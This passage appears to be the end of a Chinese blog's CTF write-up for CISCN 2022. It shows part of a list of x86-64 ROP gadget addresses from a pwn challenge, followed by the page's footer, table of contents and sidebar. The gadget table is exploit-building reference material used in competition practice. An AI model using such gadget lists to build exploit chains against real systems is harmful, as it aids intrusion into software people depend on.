data-num="179"></td><td><pre>0x00000000000226c0 : pop rbp ; ret</pre></td></tr><tr><td data-num="180"></td><td><pre>0x000000000010feb0 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; ret</pre></td></tr><tr><td data-num="181"></td><td><pre>0x0000000000046073 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</pre></td></tr><tr><td data-num="182"></td><td><pre>0x0000000000062569 : pop rbx ; pop r12 ; pop r13 ; ret</pre></td></tr><tr><td data-num="183"></td><td><pre>0x000000000005b937 : pop rbx ; pop r12 ; ret</pre></td></tr><tr><td data-num="184"></td><td><pre>0x000000000003040a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</pre></td></tr><tr><td data-num="185"></td><td><pre>0x00000000000ef192 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r15 ; ret</pre></td></tr><tr><td data-num="186"></td><td><pre>0x0000000000025b99 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</pre></td></tr><tr><td data-num="187"></td><td><pre>0x000000000008e22e : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret</pre></td></tr><tr><td data-num="188"></td><td><pre>0x000000000002f830 : pop rbx ; pop rbp ; pop r12 ; ret</pre></td></tr><tr><td data-num="189"></td><td><pre>0x000000000013641d : pop rbx ; pop rbp ; pop r13 ; pop r14 ; pop r15 ; ret</pre></td></tr><tr><td data-num="190"></td><td><pre>0x0000000000196c62 : pop rbx ; pop rbp ; pop r14 ; ret</pre></td></tr><tr><td data-num="191"></td><td><pre>0x00000000000226bf : pop rbx ; pop rbp ; ret</pre></td></tr><tr><td data-num="192"></td><td><pre>0x000000000002fdaf : pop rbx ; ret</pre></td></tr><tr><td data-num="193"></td><td><pre>0x0000000000119150 : pop rcx ; pop rbp ; pop r12 ; pop r13 ; ret</pre></td></tr><tr><td data-num="194"></td><td><pre>0x00000000001587d3 : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</pre></td></tr><tr><td data-num="195"></td><td><pre>0x000000000010257e : pop rcx ; pop rbx ; ret</pre></td></tr><tr><td data-num="196"></td><td><pre>0x0000000000118d4f : pop rcx ; ret 0xf66</pre></td></tr><tr><td data-num="197"></td><td><pre>0x00000000000248f2 : pop rdi ; pop rbp ; ret</pre></td></tr><tr><td data-num="198"></td><td><pre>0x0000000000023b6a : pop rdi ; ret</pre></td></tr><tr><td data-num="199"></td><td><pre>0x0000000000119211 : pop rdx ; pop r12 ; ret</pre></td></tr><tr><td data-num="200"></td><td><pre>0x000000000015f8c6 : pop rdx ; pop rbx ; ret</pre></td></tr><tr><td data-num="201"></td><td><pre>0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret</pre></td></tr><tr><td data-num="202"></td><td><pre>0x0000000000142c92 : pop rdx ; ret</pre></td></tr><tr><td data-num="203"></td><td><pre>0x00000000000dfc12 : pop rdx ; ret 0x10</pre></td></tr><tr><td data-num="204"></td><td><pre>0x00000000000248f0 : pop rsi ; pop r15 ; pop rbp ; ret</pre></td></tr><tr><td data-num="205"></td><td><pre>0x0000000000023b68 : pop rsi ; pop r15 ; ret</pre></td></tr><tr><td data-num="206"></td><td><pre>0x000000000002601f : pop rsi ; ret</pre></td></tr><tr><td data-num="207"></td><td><pre>0x00000000000248ec : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</pre></td></tr><tr><td data-num="208"></td><td><pre>0x0000000000023b64 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</pre></td></tr><tr><td data-num="209"></td><td><pre>0x000000000002601b : pop rsp ; pop r13 ; pop r14 ; ret</pre></td></tr><tr><td data-num="210"></td><td><pre>0x00000000000ef195 : pop rsp ; pop r13 ; pop r15 ; ret</pre></td></tr><tr><td data-num="211"></td><td><pre>0x0000000000046075 : pop rsp ; pop r13 ; pop rbp ; ret</pre></td></tr><tr><td data-num="212"></td><td><pre>0x0000000000025b9c : pop rsp ; pop r13 ; ret</pre></td></tr><tr><td data-num="213"></td><td><pre>0x000000000008e231 : pop rsp ; pop r14 ; ret</pre></td></tr><tr><td data-num="214"></td><td><pre>0x000000000012cf7e : pop rsp ; pop rbp ; ret</pre></td></tr><tr><td data-num="215"></td><td><pre>0x000000000002f70a : pop rsp ; ret</pre></td></tr><tr><td data-num="216"></td><td><pre>0x0000000000099020 : pop rsp ; ret 0xffff</pre></td></tr><tr><td data-num="217"></td><td><pre>0x0000000000022679 : ret</pre></td></tr><tr><td data-num="218"></td><td><pre>'''</span></pre></td></tr></table></figure><div class="tags"><a href="/tags/Crypto/" rel="tag"><i class="ic i-tag"></i>Crypto</a><a href="/tags/CTF/" rel="tag"><i class="ic i-tag"></i>CTF</a><a href="/tags/Misc/" rel="tag"><i class="ic i-tag"></i>Misc</a><a href="/tags/Web/" rel="tag"><i class="ic i-tag"></i>Web</a><a href="/tags/Re/" rel="tag"><i class="ic i-tag"></i>Re</a><a href="/tags/Pwn/" rel="tag"><i class="ic i-tag"></i>Pwn</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2025-01-21 14:58:19" itemprop="dateModified" datetime="2025-01-21T14:58:19+08:00">2025-01-21</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img loading="lazy" data-src="/assets/wechatpay.png" alt="Sycamore 微信支付"/><p>微信支付</p></div><div><img loading="lazy" data-src="/assets/alipay.png" alt="Sycamore 支付宝"/><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>Sycamore<i class="ic i-at"><em>@</em></i>Prism Port</li><li class="link"><strong>本文链接：</strong><a href="https://www.sycamore.top/CyberSecurity/CTF/BxsTeam-Ciscn2022-WP/" title="BxsTeam Ciscn2022 WP">https://www.sycamore.top/CyberSecurity/CTF/BxsTeam-Ciscn2022-WP/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/CyberSecurity/CTF/2021%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%A4%A7%E8%B5%9B%E4%B9%8B%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9%E5%86%B3%E8%B5%9BWriteUp/" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;res.cloudinary.com&#x2F;sycamore&#x2F;image&#x2F;upload&#x2F;v1682445106&#x2F;Typera&#x2F;2023&#x2F;04&#x2F;81bd849f0c69ea614831384a2cb8e277.png" title="2021一带一路暨金砖大赛之企业信息系统安全赛项决赛WriteUp"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>CTF</span><h3>2021一带一路暨金砖大赛之企业信息系统安全赛项决赛WriteUp</h3></a></div><div class="item right"><a href="/Develop/shokaX/hexo-shokaX%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9/" rel="next" itemprop="url" data-background-image="https:&#x2F;&#x2F;res.cloudinary.com&#x2F;sycamore&#x2F;image&#x2F;upload&#x2F;v1682846617&#x2F;Typera&#x2F;2023&#x2F;04&#x2F;577e6e5d3f3fdf4d5af4e71de5c13847.png" title="hexo-shokaX主题修改"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i>shokaX</span><h3>hexo-shokaX主题修改</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1welcometociscn"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.welcomeToCiscn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2ezphp"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.ezphp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text"> </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">3.</span> <span class="toc-text"> MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pika"><span class="toc-number">3.1.</span> <span class="toc-text"> pika</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84secret"><span class="toc-number">3.2.</span> <span class="toc-text"> 内存中的 secret</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">4.</span> <span class="toc-text"> CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eazy"><span class="toc-number">4.1.</span> <span class="toc-text"> eazy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#runfaster"><span class="toc-number">4.2.</span> <span class="toc-text"> RunFaster</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re"><span class="toc-number">5.</span> <span class="toc-text"> RE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crackme2"><span class="toc-number">5.1.</span> <span class="toc-text"> crackme2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easycry"><span class="toc-number">5.2.</span> <span class="toc-text"> easycry</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">6.</span> <span class="toc-text"> PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#duck"><span class="toc-number">6.1.</span> <span class="toc-text"> duck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bigduck"><span class="toc-number">6.2.</span> <span class="toc-text"> bigduck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#blue"><span class="toc-number">6.3.</span> <span class="toc-text"> blue</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li ><a href="/CyberSecurity/CTF/CUMTCTF-2021%E5%9B%BD%E5%BA%86%E8%B5%9BWP%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/" rel="bookmark" title="CUMTCTF 2021国庆赛WP（部分）">CUMTCTF 2021国庆赛WP（部分）</a></li><li ><a href="/CyberSecurity/CTF/CUMT-PWN%E4%B8%93%E9%A1%B9/" rel="bookmark" title="CUMT PWN专项">CUMT PWN专项</a></li><li ><a href="/CyberSecurity/CTF/2021DASCTF%E5%AE%9E%E6%88%98%E7%B2%BE%E8%8B%B1%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%9A%A8DASCTF-July-X-CBCTF-4th-misc%E9%83%A8%E5%88%86wp/" rel="bookmark" title="2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th misc部分wp">2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th misc部分wp</a></li><li ><a href="/CyberSecurity/CTF/2021-%E7%BE%8A%E5%9F%8E%E6%9D%AF-wp/" rel="bookmark" title="2021-羊城杯_wp">2021-羊城杯_wp</a></li><li ><a href="/CyberSecurity/CTF/L3H2021-PWN/" rel="bookmark" title="L3H2021 PWN部分">L3H2021 PWN部分</a></li><li ><a href="/CyberSecurity/CTF/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-YUSA%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86/" rel="bookmark" title="西湖论剑_YUSA的小秘密">西湖论剑_YUSA的小秘密</a></li><li ><a href="/CyberSecurity/CTF/SCTF%E5%A4%8D%E7%8E%B0/" rel="bookmark" title="SCTF复现">SCTF复现</a></li><li ><a href="/CyberSecurity/CTF/2022hgame-week1/" rel="bookmark" title="2022hgame week1">2022hgame week1</a></li><li ><a href="/CyberSecurity/CTF/TQLCTF-MISC-Ranma%C2%BD/" rel="bookmark" title="TQLCTF-MISC-Ranma½">TQLCTF-MISC-Ranma½</a></li><li ><a href="/CyberSecurity/CTF/CUMTCTF-2022%E5%87%BA%E9%A2%98%E9%83%A8%E5%88%86wp/" rel="bookmark" title="CUMTCTF-2022出题部分wp">CUMTCTF-2022出题部分wp</a></li><li ><a href="/CyberSecurity/CTF/2021%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%A4%A7%E8%B5%9B%E4%B9%8B%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9%E5%86%B3%E8%B5%9BWriteUp/" rel="bookmark" title="2021一带一路暨金砖大赛之企业信息系统安全赛项决赛WriteUp">2021一带一路暨金砖大赛之企业信息系统安全赛项决赛WriteUp</a></li><li  class="active"><a href="/CyberSecurity/CTF/BxsTeam-Ciscn2022-WP/" rel="bookmark" title="BxsTeam Ciscn2022 WP">BxsTeam Ciscn2022 WP</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="Sycamore" src="/assets/avatar.jpg"/><p class="name" itemprop="name">Sycamore</p><div class="description" itemprop="description"> </div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">40</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">15</span><span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">37</span><span class="name">标签</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/noneSycamore" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;noneSycamore"><i class="ic i-github"></i></a><a href="mailto:sycamore.none@gmail.com" class="item email" title="mailto:sycamore.none@gmail.com"><i class="ic i-envelope"></i></a><a target="_blank" rel="noopener" href="https://instagram.com/ziqixu41" class="item instagram" title="https:&#x2F;&#x2F;instagram.com&#x2F;ziqixu41"><i class="ic i-instagram"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a><ul class="submenu"><li class="item"><a href="/about/" rel="section"><i class="ic i-cloud"></i>关于本站</a></li></ul></li><li class="item dropdown"><a href="#" onclick="return false;"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a target="_blank" href="https://www.travellings.cn/go.html" rel="section noopener"><i class="ic i-subway"></i>开往</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/Develop/shokaX/hexo-shokaX%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/CyberSecurity/CTF/2021%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%A4%A7%E8%B5%9B%E4%B9%8B%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9%E5%86%B3%E8%B5%9BWriteUp/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/CyberSecurity/" title="分类于CyberSecurity">CyberSecurity</a><i class="ic i-angle-right"></i><a href="/categories/CyberSecurity/CTF/" title="分类于CTF">CTF</a></div><span><a href="/CyberSecurity/CTF/SCTF%E5%A4%8D%E7%8E%B0/">SCTF复现</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CyberSecurity/" title="分类于CyberSecurity">CyberSecurity</a><i class="ic i-angle-right"></i><a href="/categories/CyberSecurity/CTF/" title="分类于CTF">CTF</a></div><span><a href="/CyberSecurity/CTF/BxsTeam-Ciscn2022-WP/">BxsTeam Ciscn2022 WP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Develop/" title="分类于Develop">Develop</a><i class="ic i-angle-right"></i><a href="/categories/Develop/shokaX/" title="分类于shokaX">shokaX</a></div><span><a href="/Develop/shokaX/hexo-shokaX%20%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0%E5%92%8C%E9%85%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/">hexo-shokaX主题更新和配置修改</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CyberSecurity/" title="分类于CyberSecurity">CyberSecurity</a><i class="ic i-angle-right"></i><a href="/categories/CyberSecurity/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="分类于漏洞复现">漏洞复现</a></div><span><a href="/CyberSecurity/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%90%91%E6%97%A5%E8%91%B5RCE%E5%A4%8D%E7%8E%B0/">向日葵RCE复现</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CyberSecurity/" title="分类于CyberSecurity">CyberSecurity</a><i class="ic i-angle-right"></i><a href="/categories/CyberSecurity/CTF/" title="分类于CTF">CTF</a></div><span><a href="/CyberSecurity/CTF/2021%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%A4%A7%E8%B5%9B%E4%B9%8B%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9%E5%86%B3%E8%B5%9BWriteUp/">2021一带一路暨金砖大赛之企业信息系统安全赛项决赛WriteUp</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2><ul class="leancloud-recent-comment" id="new-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2021 -<span itemprop="copyrightYear">2025</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">Sycamore @ Sycamore's Blog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">207k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">3:08</span></div></div><script src="https://unpkg.com/busuanzi@2.3.0/bsz.pure.mini.js"></script><script>const yearSpan = document.querySelector('span[itemprop="copyrightYear"]');
if (yearSpan) {
    yearSpan.textContent += " ";
}
const authorSpan = document.querySelector('span.author[itemprop="copyrightHolder"]');
if (authorSpan) {
    authorSpan.textContent = 'Sycamore';
}
const spanElement = document.querySelector('span[title="站点阅读时长"]');
if (spanElement) {
    spanElement.textContent = " " + spanElement.textContent
    spanElement.insertAdjacentHTML('afterend', '<span id="busuanzi_short"><span class="post-meta-divider"> | </span><span class="ic i-eye"></span> <span id="busuanzi_value_site_pv"></span><span>')
}

</script><div style="width: 100%;text-align:center;"><span id="time"></span></div><script>function createtime() {
    const n = new Date("2021/11/20 00:00:00");
    now.setTime(now.getTime() + 250), days = (now - n) / 1e3 / 60 / 60 / 24, dnum = Math.floor(days), hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum, hnum = Math.floor(hours), 1 == String(hnum).length && (hnum = "0" + hnum), minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum, mnum = Math.floor(minutes), 1 == String(mnum).length && (mnum = "0" + mnum), seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum, snum = Math.round(seconds), 1 == String(snum).length && (snum = "0" + snum), document.getElementById("time").innerHTML = "此站已存活 " + dnum + " 天 " + hnum + " 小时 " + mnum + " 分 " + snum + " 秒"
}
const now = new Date;
setInterval("createtime()", 250)
</script><div style="width: 100%;text-align:center;"><span id="sentences-content" style="color: #ebb563;">一言...</span></div><div style="width: 100%;text-align:center;"><span id="sentences-from">來源</span><script type="text/javascript">fetch(`https://v1.hitokoto.cn/`)
.then(response => response.json())
.then(data => {
    var content = document.getElementById('sentences-content');
    content.innerText = data.hitokoto
    var from = document.getElementById('sentences-from');
    from.innerText = data.from + (data.from_who && data.from_who != data.from ? ' · ' + data.from_who : '')
})
.catch(console.error)</script></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
    ispost: true,
        path: `CyberSecurity/CTF/BxsTeam-Ciscn2022-WP/`,
        favicon: {
        show: `（●´3｀●）复活成功`,
        hide: `(´Д｀)浏览器崩溃啦`
    },
    search: {
        placeholder: "文章搜索",
        empty: "关于 「 ${query} 」，什么也没搜到",
        stats: "${time} ms 内找到 ${hits} 条结果"
    },
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    fancybox: true,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
    quiz: {
        choice: `单选题`,
        multiple: `多选题`,
        true_false: `判断题`,
        essay: `问答题`,
        gap_fill: `填空题`,
        mistake: `错题备注`
    },
    ignores: [
        (uri) => uri.includes('#'),
        (uri) => new RegExp(LOCAL.path + '$').test(uri),
            []
    ]
};
</script><script src="https://s4.zstatic.net/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous" fetchpriority="high"></script><script src="https://s4.zstatic.net/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha384-ZvpUoO&#x2F;+PpLXR1lu4jmpXWu80pZlYUAfxl5NsBMWOEPSjUn&#x2F;6Z&#x2F;hRTt8+pR6L4N2" crossorigin="anonymous" fetchpriority="high"></script><script src="/js/siteInit.js?v=0.4.17" type="module" fetchpriority="high" defer></script></body></html>